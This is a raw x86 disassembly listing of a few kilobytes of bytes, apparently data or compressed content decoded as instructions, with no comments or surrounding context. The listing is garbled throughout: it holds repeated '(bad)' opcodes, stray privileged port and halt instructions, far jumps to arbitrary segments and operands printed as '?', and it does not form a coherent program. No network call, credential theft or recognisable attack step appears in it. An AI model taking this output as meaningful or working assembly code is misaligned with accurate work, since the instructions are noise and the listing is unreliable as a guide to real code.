  43b529:	mov    bh,0x26
  43b52b:	adc    eax,0xb1ae69
  43b530:	add    BYTE PTR [eax],al
  43b532:	add    BYTE PTR [eax],al
  43b534:	add    BYTE PTR [eax+0x4400e5b],dl
  43b53a:	popa   
  43b53b:	mov    ebp,?
  43b53d:	adc    al,0x96
  43b53f:	out    dx,al
  43b540:	adc    esp,eax
  43b542:	shl    BYTE PTR [edi],0x13
  43b545:	adc    BYTE PTR [esi-0x4c200032],al
  43b54b:	adc    bh,cl
  43b54d:	jge    0x43b534
  43b54f:	sbb    DWORD PTR [eax-0x70],eax
  43b552:	in     al,0xa9
  43b554:	and    esi,DWORD PTR [esp+esi*4-0x32]
  43b558:	and    esp,DWORD PTR [ecx+esi*2+0x59905ce2]
  43b55f:	mov    esi,0xf2add484
  43b564:	and    al,0xcc
  43b566:	mov    ch,0x1a
  43b568:	push   eax
  43b569:	das    
  43b56a:	push   ds
  43b56b:	retf   0x271f
  43b56e:	inc    esi
  43b56f:	retf   0xaa1f
  43b572:	pop    ecx
  43b573:	mov    edi,0x19cd7df8
  43b578:	inc    eax
  43b579:	nop
  43b57a:	sbb    al,bl
  43b57c:	pop    edx
  43b57d:	imul   ebx,esp,0x29
  43b580:	adc    dl,dl
  43b582:	dec    ebp
  43b583:	push   cs
  43b584:	dec    edi
  43b585:	arpl   WORD PTR [esi+0x6b],ax
  43b588:	ins    BYTE PTR es:[edi],dx
  43b589:	mov    ah,0x89
  43b58b:	rol    BYTE PTR [ebp+ecx*8-0x4bab9458],0x69
  43b593:	gs out dx,eax
  43b595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b596:	cmp    dl,BYTE PTR [ebx]
  43b598:	add    BYTE PTR [eax],al
  43b59a:	add    BYTE PTR [eax],al
  43b59c:	add    BYTE PTR [eax],al
  43b59e:	nop
  43b59f:	std    
  43b5a0:	int    0x65
  43b5a2:	xchg   ebx,eax
  43b5a3:	xchg   edx,eax
  43b5a4:	lds    edi,FWORD PTR [esi-0x413aa1bc]
  43b5aa:	cmp    al,0xb3
  43b5ac:	(bad)  
  43b5ad:	push   ebp
  43b5ae:	xchg   ecx,eax
  43b5af:	pop    ecx
  43b5b0:	push   cs
  43b5b1:	je     0x43b537
  43b5b3:	mov    dl,0xbc
  43b5b5:	inc    esp
  43b5b6:	and    al,0xc1
  43b5b8:	mov    esp,0x642d8944
  43b5bd:	add    al,0x90
  43b5bf:	mov    dl,0x58
  43b5c1:	std    
  43b5c2:	test   DWORD PTR [edi-0x8],esp
  43b5c5:	icebp  
  43b5c6:	fs pop ebx
  43b5c8:	aad    0x66
  43b5ca:	xchg   edx,eax
  43b5cb:	mov    ah,0xf7
  43b5cd:	add    esi,DWORD PTR [ebp+0x5d]
  43b5d0:	cmp    DWORD PTR [ebx],eax
  43b5d2:	data16 addr16 clc 
  43b5d5:	sbb    ch,BYTE PTR [edx+0x27]
  43b5d8:	jg     0x43b5de
  43b5da:	nop
  43b5db:	mov    dl,0x4c
  43b5dd:	clc    
  43b5de:	or     BYTE PTR [eax],dl
  43b5e0:	clc    
  43b5e1:	add    edx,DWORD PTR [eax+0x1d66fb5b]
  43b5e7:	mov    dl,0xf7
  43b5e9:	add    esp,ebp
  43b5eb:	mov    al,0x20
  43b5ed:	adc    DWORD PTR [esp+eax*8],esi
  43b5f0:	mov    bh,0x3
  43b5f2:	or     eax,0x1513dbf6
  43b5f7:	sbb    BYTE PTR [edi-0x30],0x73
  43b5fb:	retf   0x75be
  43b5fe:	jl     0x43b5b1
  43b600:	test   DWORD PTR [ebx],0x0
  43b606:	add    BYTE PTR [ebx+0x6855cef0],al
  43b60c:	mov    cl,0xf7
  43b60e:	add    eax,DWORD PTR [ebx+0x747dcca8]
  43b614:	mov    cl,0xf7
  43b616:	add    ebp,DWORD PTR [ebx-0x6ffc0aa6]
  43b61c:	fild   WORD PTR [esi]
  43b61e:	cmp    BYTE PTR [ebp-0x4e660d24],0x0
  43b625:	fst    DWORD PTR [eax]
  43b627:	or     al,0xbe
  43b629:	aaa    
  43b62a:	add    al,0xe8
  43b62c:	mov    ecx,0x72650c23
  43b631:	punpcklbw mm5,DWORD PTR ds:0x93e90fda
  43b638:	das    
  43b639:	xchg   ecx,eax
  43b63a:	or     eax,0x700eb295
  43b63f:	adc    eax,0x93e90fd6
  43b644:	das    
  43b645:	rol    BYTE PTR [edx-0x32a4d071],cl
  43b64b:	mov    ds:0x8bc5432f,eax
  43b650:	sub    eax,0xb29501b9
  43b655:	push   cs
  43b656:	pusha  
  43b657:	adc    eax,0x93e90fcf
  43b65c:	sub    eax,0xb28ccd99
  43b661:	push   cs
  43b662:	(bad)  
  43b663:	ror    BYTE PTR [ebx],1
  43b665:	dec    ecx
  43b666:	lods   al,BYTE PTR ds:[esi]
  43b667:	pop    edx
  43b668:	std    
  43b669:	int3   
  43b66a:	in     eax,dx
  43b66b:	add    BYTE PTR [eax],al
  43b66d:	add    BYTE PTR [eax],al
  43b66f:	add    BYTE PTR [ebx+0x45943df5],dl
  43b675:	das    
  43b676:	arpl   WORD PTR ds:0x33960398,cx
  43b67c:	stos   BYTE PTR es:[edi],al
  43b67d:	dec    ebp
  43b67e:	nop
  43b67f:	daa    
  43b680:	xchg   esp,eax
  43b681:	fs jmp 0xe17:0x8fb5e7e9
  43b689:	push   0xae37e9ea
  43b68e:	pop    DWORD PTR [edi]
  43b690:	jmp    DWORD PTR [edi-0x16]
  43b693:	jmp    0xebb8bad8
  43b698:	fisubr WORD PTR [edx+0x4]
  43b69b:	gs xor dl,0xe
  43b69f:	jb     0x43b6ed
  43b6a1:	lahf   
  43b6a2:	mov    ebx,DWORD PTR [ecx-0x6d]
  43b6a5:	mov    dl,0xe
  43b6a7:	pop    ebp
  43b6a8:	sar    DWORD PTR [eax],1
  43b6aa:	push   ebx
  43b6ab:	add    eax,0x96029c
  43b6b0:	ins    DWORD PTR es:[edi],dx
  43b6b1:	push   edx
  43b6b2:	or     ch,BYTE PTR [edx+0x4d]
  43b6b5:	pop    edi
  43b6b6:	lahf   
  43b6b7:	into   
  43b6b8:	mov    dh,0xd6
  43b6ba:	into   
  43b6bb:	push   0xffffffbb
  43b6bd:	lock leave 
  43b6bf:	adc    BYTE PTR [edx-0x7caca657],ah
  43b6c5:	push   ecx
  43b6c6:	aas    
  43b6c7:	dec    DWORD PTR [ecx+edx*1-0x1b86c003]
  43b6ce:	into   
  43b6cf:	je     0x43b730
  43b6d1:	xor    ch,BYTE PTR [ebx+0x24]
  43b6d4:	add    BYTE PTR [eax],al
  43b6d6:	add    BYTE PTR [eax],al
  43b6d8:	add    BYTE PTR [ecx-0x4d],bl
  43b6db:	pop    ss
  43b6dc:	test   BYTE PTR [edx-0x50],bl
  43b6df:	push   cs
  43b6e0:	add    dl,bh
  43b6e2:	sbb    ch,BYTE PTR [esi]
  43b6e4:	adc    BYTE PTR [ebp+0x5e],ch
  43b6e7:	mov    ds,WORD PTR [eax]
  43b6e9:	push   0xc4890eb1
  43b6ee:	push   ds
  43b6ef:	jmp    0x532df0f3
  43b6f4:	and    al,0x35
  43b6f6:	pop    esi
  43b6f7:	lahf   
  43b6f8:	fsub   DWORD PTR [esi]
  43b6fa:	(bad)  
  43b6fb:	int3   
  43b6fc:	mov    ebp,DWORD PTR [ebx*1-0xfc6c002]
  43b703:	out    dx,al
  43b704:	adc    BYTE PTR [edx],ah
  43b706:	repnz ds push edi
  43b709:	add    edx,DWORD PTR [ecx+0x3f]
  43b70c:	dec    edi
  43b70e:	arpl   WORD PTR [edx+0x6c9d7240],bp
  43b714:	cmp    DWORD PTR ds:0xce750685,ebp
  43b71a:	dec    edx
  43b71b:	jmp    0xf4d9:0x8ec68b31
  43b722:	lea    edx,[edi]
  43b724:	mov    bh,0x29
  43b726:	mov    fs,WORD PTR [edx+0x24]
  43b729:	sub    ebx,0x7c9050bf
  43b72f:	mov    edx,0x20d07823
  43b734:	call   0xf977246c
  43b739:	pusha  
  43b73a:	mov    esp,0xd233
  43b73f:	add    BYTE PTR [eax],al
  43b741:	add    BYTE PTR [ecx-0x6ffff1e9],bh
  43b747:	adc    al,0xba
  43b749:	and    esi,DWORD PTR [eax+eiz*8+0x5a]
  43b74d:	call   0xf976fc99
  43b752:	sbb    ecx,DWORD PTR [edx-0x71]
  43b755:	cmc    
  43b756:	cwde   
  43b757:	test   BYTE PTR [ebx+0x22],ah
  43b75a:	xchg   ecx,eax
  43b75b:	pop    ecx
  43b75c:	push   cs
  43b75d:	or     DWORD PTR [edi+eiz*8],ecx
  43b760:	or     eax,0x36d89000
  43b765:	(bad)  
  43b766:	xchg   esi,eax
  43b767:	int    0x70
  43b769:	add    BYTE PTR [eax-0x6c0a70a7],dl
  43b76f:	jge    0x43b727
  43b771:	jl     0x43b7be
  43b773:	push   edi
  43b774:	mov    edx,0x38191553
  43b779:	jge    0x43b7b3
  43b77b:	pop    ebx
  43b77c:	mov    ebx,0x6ca41143
  43b781:	add    BYTE PTR [eax+0x1122ba59],dl
  43b787:	xchg   esp,eax
  43b788:	outs   dx,DWORD PTR ds:[esi]
  43b789:	add    BYTE PTR [eax+0x1133ba59],dl
  43b78f:	les    ebp,FWORD PTR [esi+0x0]
  43b792:	nop
  43b793:	pop    ecx
  43b794:	mov    edx,0x6db4112b
  43b799:	add    BYTE PTR [eax+0x1123ba59],dl
  43b79f:	fs dec esp
  43b7a1:	add    BYTE PTR [eax+0x63b959],dl
  43b7a7:	add    BYTE PTR [eax],al
  43b7a9:	add    BYTE PTR [eax],al
  43b7ab:	stc    
  43b7ac:	fisttp QWORD PTR [eax+eax*1]
  43b7af:	nop
  43b7b0:	mov    dl,0x3d
  43b7b2:	add    eax,0xae20b26e
  43b7b7:	iret   
  43b7b8:	cld    
  43b7b9:	sar    cl,0xab
  43b7bc:	mov    ebp,0x83150437
  43b7c1:	pop    ebp
  43b7c2:	push   ecx
  43b7c3:	test   al,0x96
  43b7c5:	stos   DWORD PTR es:[edi],eax
  43b7c6:	and    ebp,DWORD PTR [ecx+0x7be82c63]
  43b7cc:	inc    DWORD PTR [ecx]
  43b7ce:	das    
  43b7cf:	xor    DWORD PTR [bp+si-0x6f9b],esi
  43b7d4:	mov    dl,0xf7
  43b7d6:	cwde   
  43b7d7:	xchg   esi,eax
  43b7d8:	fdiv   st,st(7)
  43b7da:	lods   eax,DWORD PTR ds:[esi]
  43b7db:	mov    BYTE PTR [ebx+0x3],ah
  43b7de:	or     al,0x75
  43b7e0:	call   0x3f7:0xb2302276
  43b7e7:	jecxz  0x43b774
  43b7e9:	or     eax,0x8d64ee04
  43b7ee:	xor    edi,ebx
  43b7f0:	fs xchg ebp,eax
  43b7f2:	add    al,0x90
  43b7f4:	mov    dl,0xc2
  43b7f6:	in     al,0x7
  43b7f8:	rol    BYTE PTR [edi+0x4],cl
  43b7fb:	nop
  43b7fc:	arpl   sp,ax
  43b7fe:	out    0x6b,eax
  43b800:	mov    bl,0x68
  43b802:	inc    esp
  43b803:	loopne 0x43b7df
  43b805:	lds    eax,FWORD PTR [eax+edx*4]
  43b808:	mov    dl,0x88
  43b80a:	and    al,BYTE PTR [ebx+0xc3c3f6]
  43b810:	add    BYTE PTR [eax],al
  43b812:	add    BYTE PTR [eax],al
  43b814:	pop    ds
  43b815:	add    al,0xd2
  43b817:	sar    BYTE PTR [ecx+ecx*1+0x320ffc36],0x2
  43b81f:	imul   edx,DWORD PTR [eax+0x1412f7b2],0x9003f6b1
  43b829:	xor    edx,ebp
  43b82b:	fs nop
  43b82d:	mov    dl,0xe
  43b82f:	jmp    0xef2d95e8
  43b834:	mov    dl,0xe3
  43b836:	call   0xef64bc5
  43b83b:	push   ebp
  43b83c:	inc    ebp
  43b83d:	jecxz  0x43b827
  43b83f:	mov    WORD PTR [ebx+0x17de0eb2],ss
  43b845:	test   BYTE PTR [edi],cl
  43b847:	jmp    0x892c9bdf
  43b84c:	xchg   ebx,eax
  43b84d:	mov    dl,0xe
  43b84f:	cmp    al,0x59
  43b851:	int3   
  43b852:	fxsave [edi]
  43b855:	(bad)  
  43b856:	cs ds out 0x62,al
  43b85a:	inc    ecx
  43b85b:	sahf   
  43b85c:	mov    BYTE PTR [esi+0x378c2903],bh
  43b862:	mov    edi,0x7f4ae062
  43b867:	xor    BYTE PTR [edx+0x1453f65b],0x5d
  43b86e:	lods   eax,DWORD PTR ds:[esi]
  43b86f:	jmp    0x645d6b07
  43b874:	inc    ebp
  43b875:	pop    ebx
  43b876:	jmp    0x0:0x66
  43b87d:	push   es
  43b87e:	div    DWORD PTR [edx]
  43b880:	add    DWORD PTR [ebx-0x6c16cd0e],ebp
  43b886:	pusha  
  43b887:	jmp    0x9339:0x2f1ac4d5
  43b88e:	mov    dl,0xf7
  43b890:	mov    edx,0x6aea5b72
  43b895:	xchg   BYTE PTR [ecx+0x2c82a962],bh
  43b89b:	and    esp,DWORD PTR [esi]
  43b89d:	jb     0x43b8fa
  43b89f:	mov    fs,WORD PTR [edx]
  43b8a1:	add    al,0xdc
  43b8a3:	mov    ah,0x6a
  43b8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b8a6:	(bad)  
  43b8a7:	(bad)  
  43b8a8:	out    dx,al
  43b8a9:	push   ss
  43b8aa:	push   0x2afe0004
  43b8af:	or     bh,bh
  43b8b1:	out    dx,al
  43b8b2:	xchg   ebx,eax
  43b8b3:	imul   edi,esi,0xeb55b
  43b8b9:	mov    esi,0xeefefa2a
  43b8be:	xchg   ebx,eax
  43b8bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b8c0:	sub    al,0xb6
  43b8c3:	push   cs
  43b8c4:	jmp    0x2b4c67
  43b8c9:	sub    BYTE PTR [eax+ecx*4+0x17b5a900],dl
  43b8d0:	test   edx,esi
  43b8d2:	xchg   esp,eax
  43b8d3:	out    0xff,eax
  43b8d5:	ror    BYTE PTR [ebp-0x19],1
  43b8d8:	(bad)  
  43b8d9:	out    dx,al
  43b8da:	std    
  43b8db:	out    0xff,eax
  43b8dd:	test   eax,0xfe69b5
  43b8e2:	add    BYTE PTR [eax],al
  43b8e4:	add    BYTE PTR [eax],al
  43b8e6:	(bad)  [esi+0x50a4000e]
  43b8ec:	xchg   ebx,eax
  43b8ed:	inc    esp
  43b8ee:	push   ebp
  43b8ef:	pop    ebp
  43b8f0:	xchg   ebx,eax
  43b8f1:	inc    eax
  43b8f2:	inc    ebp
  43b8f3:	int3   
  43b8f4:	push   cs
  43b8f5:	add    BYTE PTR [eax-0x4b],bh
  43b8f8:	pop    ss
  43b8f9:	test   BYTE PTR [edx-0x6e],bl
  43b8fc:	out    0xff,eax
  43b8fe:	push   esp
  43b8ff:	mov    ch,0xe
  43b901:	add    BYTE PTR [eax-0x46],ch
  43b904:	(bad)  
  43b905:	sbb    edi,DWORD PTR [ecx+0x59]
  43b908:	cli    
  43b909:	add    BYTE PTR [ecx],bh
  43b90b:	mov    ch,0xd
  43b90d:	xor    cl,bl
  43b90f:	mov    dh,0xe
  43b911:	movzx  esi,dh
  43b914:	repz push cs
  43b916:	mov    eax,0x3900ad94
  43b91b:	mov    ch,0x17
  43b91d:	test   DWORD PTR [esi-0x6c],ebp
  43b920:	out    0xff,eax
  43b922:	mov    ds:0xb9856cf5,al
  43b927:	ret    
  43b928:	xchg   edx,eax
  43b929:	hlt    
  43b92a:	nop
  43b92b:	leave  
  43b92c:	das    
  43b92d:	stc    
  43b92e:	jbe    0x43b8b4
  43b930:	dec    ebp
  43b931:	or     DWORD PTR ds:0xeff92cc0,ecx
  43b937:	pop    edi
  43b938:	and    BYTE PTR [ebx],0xb4
  43b93b:	inc    eax
  43b93c:	mov    esp,0x2cc2e974
  43b941:	stc    
  43b942:	xlat   BYTE PTR ds:[ebx]
  43b943:	retf   
  43b944:	cmp    DWORD PTR [eax+0x63],edx
  43b947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b949:	push   eax
  43b94a:	add    BYTE PTR [eax],al
  43b94c:	add    BYTE PTR [eax],al
  43b94e:	add    BYTE PTR [ebx],bl
  43b950:	add    bl,0xc6
  43b953:	or     ebx,DWORD PTR [eax-0x1c257b1e]
  43b959:	xor    al,0x62
  43b95b:	imul   esp,ebx,0x4aa7fedd
  43b961:	xor    BYTE PTR [ecx],0xb
  43b964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b965:	mul    BYTE PTR [edi-0x62]
  43b968:	or     ecx,DWORD PTR ds:0xa1e4a174
  43b96e:	and    ebp,esp
  43b970:	lahf   
  43b971:	fwait
  43b972:	leave  
  43b973:	push   0x77f90b54
  43b978:	int    0x32
  43b97a:	cli    
  43b97b:	mov    ds:0x8cbd0822,eax
  43b980:	pop    ebp
  43b981:	sbb    DWORD PTR [esi-0x6f],esp
  43b984:	mov    edx,0xe5422c9d
  43b989:	ds call 0xf9728d5b
  43b98f:	sbb    edx,DWORD PTR [esi]
  43b991:	repnz or DWORD PTR ds:0x13f2,edi
  43b997:	sub    ebp,DWORD PTR [edi+0x4a98a89b]
  43b99d:	push   cs
  43b99e:	add    BYTE PTR ds:0x90180f7,cl
  43b9a4:	repnz adc ebp,DWORD PTR ds:[ebx]
  43b9a8:	mov    bl,0xe6
  43b9aa:	mov    dl,0xbd
  43b9ac:	test   BYTE PTR [ebp+0x50],bl
  43b9af:	clc    
  43b9b0:	ret    
  43b9b1:	sub    BYTE PTR [esi],bl
  43b9b3:	add    BYTE PTR [eax],al
  43b9b5:	add    BYTE PTR [eax],al
  43b9b7:	add    cl,bh
  43b9b9:	scas   eax,DWORD PTR es:[edi]
  43b9ba:	inc    eax
  43b9bb:	inc    ebx
  43b9bc:	maskmovq mm3,mm3
  43b9bf:	not    DWORD PTR [edi+eiz*8]
  43b9c2:	shr    DWORD PTR [ebx-0x733807f4],cl
  43b9c8:	dec    esp
  43b9c9:	xchg   esi,eax
  43b9ca:	xchg   ebx,eax
  43b9cb:	mov    cl,BYTE PTR [eax]
  43b9cd:	mov    bl,0xf6
  43b9cf:	add    edx,DWORD PTR [eax+0xef4312b]
  43b9d5:	and    edi,esp
  43b9d7:	add    al,0x90
  43b9d9:	mov    dl,0x72
  43b9db:	cmp    ecx,DWORD PTR [ecx-0x6ffd68ca]
  43b9e1:	mov    dl,0x5c
  43b9e3:	inc    ebx
  43b9e4:	and    eax,0x548cf652
  43b9e9:	xchg   esi,eax
  43b9ea:	mov    edi,0xf6cc9397
  43b9ef:	sub    dl,BYTE PTR [ecx-0x3f74a98]
  43b9f5:	stos   DWORD PTR es:[edi],eax
  43b9f6:	or     eax,0x6cb12e04
  43b9fb:	dec    edi
  43b9fc:	push   0x69218a6b
  43ba01:	sub    esi,DWORD PTR [ebp+0x6e927083]
  43ba07:	enter  0xbeb3,0xe3
  43ba0b:	pop    es
  43ba0c:	out    dx,al
  43ba0d:	mov    cl,0x3c
  43ba0f:	pop    es
  43ba10:	inc    edx
  43ba11:	jae    0x43b9cb
  43ba13:	xchg   edi,eax
  43ba14:	mov    esp,cs
  43ba16:	not    DWORD PTR [ecx-0x6c]
  43ba19:	sub    ecx,DWORD PTR [ecx]
  43ba1b:	sub    al,0x0
  43ba1d:	add    BYTE PTR [eax],al
  43ba1f:	add    BYTE PTR [eax],al
  43ba21:	in     al,0x87
  43ba23:	push   ebx
  43ba24:	pop    ds
  43ba25:	adc    eax,0x98247573
  43ba2a:	sub    DWORD PTR [edi],ecx
  43ba2c:	lods   eax,DWORD PTR ds:[esi]
  43ba2d:	aaa    
  43ba2e:	mov    edi,0x5fe9e562
  43ba33:	cmc    
  43ba34:	out    dx,al
  43ba35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ba36:	sbb    eax,0xd89a94ff
  43ba3b:	push   cs
  43ba3c:	pop    ebx
  43ba3d:	xchg   edx,eax
  43ba3e:	xor    eax,0x842101da
  43ba43:	in     al,dx
  43ba44:	push   es
  43ba45:	sbb    esi,ecx
  43ba47:	(bad)  
  43ba48:	imul   ebp,DWORD PTR [eax],0xffffff93
  43ba4b:	(bad)  
  43ba4c:	cmc    
  43ba4d:	inc    ebx
  43ba4e:	mov    dh,0xf
  43ba50:	jmp    0xe9e313e8
  43ba55:	xchg   esp,eax
  43ba56:	mov    dl,0xe
  43ba58:	push   ebx
  43ba59:	clc    
  43ba5a:	pop    es
  43ba5b:	neg    DWORD PTR [ecx]
  43ba5d:	push   ebp
  43ba5e:	pop    ebx
  43ba5f:	jmp    0x5469:0xfe92c762
  43ba66:	fs xchg esi,eax
  43ba68:	mov    ecx,0x3e126712
  43ba6d:	(bad)  
  43ba6e:	aam    0xde
  43ba70:	pop    ss
  43ba71:	ja     0x43ba36
  43ba73:	es cld 
  43ba75:	push   ebx
  43ba76:	pop    esi
  43ba77:	mov    bh,0xe9
  43ba79:	xchg   ebx,eax
  43ba7a:	mov    dl,0x4e
  43ba7c:	sbb    eax,0xe90f2874
  43ba81:	shl    DWORD PTR [edx+0xb195],cl
  43ba87:	add    BYTE PTR [eax],al
  43ba89:	add    BYTE PTR [edx+0x78],dh
  43ba8c:	es mov bl,0xff
  43ba8f:	scas   al,BYTE PTR es:[edi]
  43ba90:	mov    bh,0xe9
  43ba92:	xchg   ebx,eax
  43ba93:	mov    dh,0x8e
  43ba95:	hlt    
  43ba96:	xchg   DWORD PTR [eax],eax
  43ba98:	jmp    0x18e9:0x4ec713fc
  43ba9f:	jae    0x43babb
  43baa1:	lods   al,BYTE PTR ds:[esi]
  43baa2:	mov    ds:0x2bd5e131,eax
  43baa7:	aaa    
  43baa8:	fld    DWORD PTR [eax]
  43baaa:	rcr    DWORD PTR [ebx],0xdc
  43baad:	std    
  43baae:	leavew 
  43bab0:	dec    esi
  43bab1:	je     0x43baf7
  43bab3:	jns    0x43ba92
  43bab5:	je     0x43bad7
  43bab7:	or     al,0xea
  43bab9:	push   ebp
  43baba:	mov    dh,0x5a
  43babc:	push   es
  43babd:	adc    eax,0xd093b239
  43bac2:	adc    esi,DWORD PTR [edi+0x293f0070]
  43bac8:	fsubr  st,st(0)
  43baca:	es mov edi,0x5182ffe7
  43bad0:	(bad)  
  43bad1:	in     eax,dx
  43bad2:	pop    ebp
  43bad3:	push   edx
  43bad4:	cmp    eax,0x2e1bcff
  43bad9:	inc    eax
  43bada:	mov    ecx,0x9274cf34
  43badf:	xor    eax,0x7ab274dd
  43bae4:	clc    
  43bae5:	je     0x43ba95
  43bae7:	(bad)  
  43bae8:	push   edx
  43bae9:	and    al,0xcd
  43baeb:	mov    dh,0x62
  43baed:	or     al,0x0
  43baef:	add    BYTE PTR [eax],al
  43baf1:	add    BYTE PTR [eax],al
  43baf3:	and    al,ch
  43baf5:	iret   
  43baf6:	inc    esp
  43baf7:	lea    esp,[esi-0x17]
  43bafa:	jmp    FWORD PTR [ecx-0x7e80c4f]
  43bb00:	mov    ebx,0xb1797fe9
  43bb05:	bound  ecx,QWORD PTR [edi]
  43bb07:	xchg   ebx,eax
  43bb08:	mov    cl,0x70
  43bb0a:	add    BYTE PTR [ebx-0x1d2dc44a],dl
  43bb10:	out    dx,eax
  43bb11:	test   BYTE PTR [eax+edx*1],0xbf
  43bb15:	out    0x85,eax
  43bb17:	fild   QWORD PTR [edi-0x4e97896e]
  43bb1d:	push   cs
  43bb1e:	(bad)  
  43bb1f:	std    
  43bb20:	push   esp
  43bb21:	cs push eax
  43bb23:	push   ebp
  43bb25:	push   edx
  43bb26:	and    al,0x90
  43bb28:	mov    bh,0xee
  43bb2a:	push   DWORD PTR [edi]
  43bb2c:	dec    ebx
  43bb2d:	or     edx,DWORD PTR [ebx]
  43bb2f:	sbb    BYTE PTR [edi-0x32],bh
  43bb32:	dec    DWORD PTR [ebx+ecx*4]
  43bb35:	sbb    eax,DWORD PTR [edx+edi*4+0xb000e4a]
  43bb3c:	pop    ss
  43bb3d:	repnz addr16 lahf 
  43bb40:	cld    
  43bb41:	cmp    al,BYTE PTR [ebp+0x8b2774c]
  43bb47:	inc    edi
  43bb48:	mov    ecx,DWORD PTR [ebp-0x1d]
  43bb4b:	mov    al,ds:0x6c7d3650
  43bb50:	outs   dx,DWORD PTR ds:[esi]
  43bb51:	fdivp  st(6),st
  43bb53:	pop    esp
  43bb54:	sbb    edx,DWORD PTR [edi+0xca]
  43bb5a:	add    BYTE PTR [eax],al
  43bb5c:	call   0xd83ed8f8
  43bb61:	repnz bnd jae 0x43bafd
  43bb65:	loopne 0x43bbbf
  43bb67:	xchg   DWORD PTR [edi+esi*4],esi
  43bb6a:	mov    edx,0xd1d075e4
  43bb6f:	and    ebp,DWORD PTR [eax]
  43bb71:	mov    al,0xd6
  43bb73:	and    ebp,DWORD PTR [esp+eiz*2+0x43]
  43bb77:	enter  0x971b,0xf6
  43bb7b:	arpl   WORD PTR [ebx-0x71],bp
  43bb7e:	div    BYTE PTR [edi]
  43bb80:	shr    DWORD PTR [ecx-0x22],1
  43bb83:	or     BYTE PTR [edi+0xa],al
  43bb86:	pop    ss
  43bb87:	enter  0x567b,0x97
  43bb8b:	dec    esp
  43bb8c:	mov    ah,0xb1
  43bb8e:	xchg   ebp,eax
  43bb8f:	dec    esp
  43bb90:	lods   al,BYTE PTR ds:[esi]
  43bb91:	mov    cl,0x8f
  43bb93:	jl     0x43bb49
  43bb95:	push   ecx
  43bb96:	push   cs
  43bb97:	je     0x43bb2f
  43bb99:	(bad)  
  43bb9a:	popf   
  43bb9b:	xor    DWORD PTR [bp+si+0xe],ecx
  43bb9f:	add    al,ch
  43bba1:	dec    edx
  43bba2:	adc    BYTE PTR [eax],al
  43bba4:	nop
  43bba5:	mov    dl,0x3c
  43bba7:	repnz inc ecx
  43bba9:	jo     0x43bb9f
  43bbab:	xchg   edi,eax
  43bbac:	cdq    
  43bbad:	add    eax,0xb315aba7
  43bbb2:	test   DWORD PTR [ebx],0x3f5b0b8
  43bbb8:	nop
  43bbb9:	pop    ebx
  43bbba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bbbb:	out    0x7f,eax
  43bbbd:	sub    eax,0xe7bc
  43bbc2:	add    BYTE PTR [eax],al
  43bbc4:	add    BYTE PTR [edi+0x2],bl
  43bbc7:	ins    DWORD PTR es:[edi],dx
  43bbc8:	xor    eax,0x2e006c15
  43bbcd:	(bad)  
  43bbce:	pop    ebx
  43bbcf:	or     DWORD PTR [eax+0x3e3967c],eax
  43bbd5:	jl     0x43bb98
  43bbd7:	mov    ds:0x8396641c,al
  43bbdc:	stos   DWORD PTR es:[edi],eax
  43bbdd:	xor    BYTE PTR [ebx-0x4c97fc09],dh
  43bbe3:	cmc    
  43bbe4:	add    edx,DWORD PTR [eax+0xd15c447]
  43bbea:	repz dec ebx
  43bbec:	in     eax,0x62
  43bbee:	pop    ebx
  43bbef:	inc    esp
  43bbf0:	loopne 0x43bc1d
  43bbf2:	retf   0x48f
  43bbf5:	nop
  43bbf6:	mov    dl,0x4f
  43bbf8:	or     al,0xae
  43bbfa:	pop    ebx
  43bbfb:	clc    
  43bbfc:	sbb    bl,BYTE PTR [esi+edx*4]
  43bbff:	pop    ss
  43bc00:	mov    DWORD PTR [esi+edx*4-0x21],edx
  43bc04:	mov    bl,0xc
  43bc06:	test   DWORD PTR [ebp+0x4b],ebp
  43bc09:	js     0x43bc16
  43bc0b:	scas   al,BYTE PTR es:[edi]
  43bc0c:	sbb    ecx,DWORD PTR [ecx-0x601ff3d1]
  43bc12:	mov    dl,0xb
  43bc14:	cmc    
  43bc15:	loop   0x43bc72
  43bc17:	add    al,0xe0
  43bc19:	sti    
  43bc1a:	retf   0x45b
  43bc1d:	nop
  43bc1e:	mov    dl,0xff
  43bc20:	call   FWORD PTR [esi+0x5b]
  43bc23:	psubsw mm4,QWORD PTR [esi+0xaae0c6]
  43bc2a:	add    BYTE PTR [eax],al
  43bc2c:	add    BYTE PTR [eax],al
  43bc2e:	inc    esp
  43bc2f:	fild   QWORD PTR [edi]
  43bc31:	mov    esp,0xcd32e6aa
  43bc36:	jmp    0x43bc47
  43bc38:	psubsw mm2,QWORD PTR [ebx-0x6c14ec36]
  43bc3f:	mov    dl,0xe9
  43bc41:	mov    ebp,0xa59bbb47
  43bc46:	aas    
  43bc47:	mov    ds:0x3562623e,eax
  43bc4c:	fiadd  DWORD PTR [ecx+0x25]
  43bc4f:	gs jmp 0xf495:0x101da226
  43bc57:	(bad)  
  43bc58:	jmp    0x9c0a93fa
  43bc5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bc5e:	iret   
  43bc5f:	xchg   BYTE PTR [esi+0x49],dh
  43bc62:	mov    WORD PTR [edx+0x5c93910e],?
  43bc68:	jmp    0x1ec9:0x32e67ae9
  43bc6f:	cmp    BYTE PTR [edi],0x72
  43bc72:	pop    edx
  43bc73:	dec    edx
  43bc74:	push   esi
  43bc75:	jecxz  0x43bc11
  43bc77:	pop    ecx
  43bc78:	loop   0x43bc24
  43bc7a:	xchg   ebx,eax
  43bc7b:	stos   BYTE PTR es:[edi],al
  43bc7c:	push   cs
  43bc7d:	jmp    0xe9b84da1
  43bc82:	mov    ebp,0x6bae966c
  43bc87:	(bad)  
  43bc88:	ret    0x7ab4
  43bc8b:	test   eax,0xce701da1
  43bc90:	sbb    DWORD PTR [esi+0x0],ebx
  43bc93:	add    BYTE PTR [eax],al
  43bc95:	add    BYTE PTR [eax],al
  43bc97:	rol    DWORD PTR ds:0xaf8388d0,cl
  43bc9d:	(bad)  
  43bc9e:	cmp    BYTE PTR [eax+esi*4],ah
  43bca1:	or     al,0xe9
  43bca3:	xchg   ebx,eax
  43bca4:	add    al,0xea
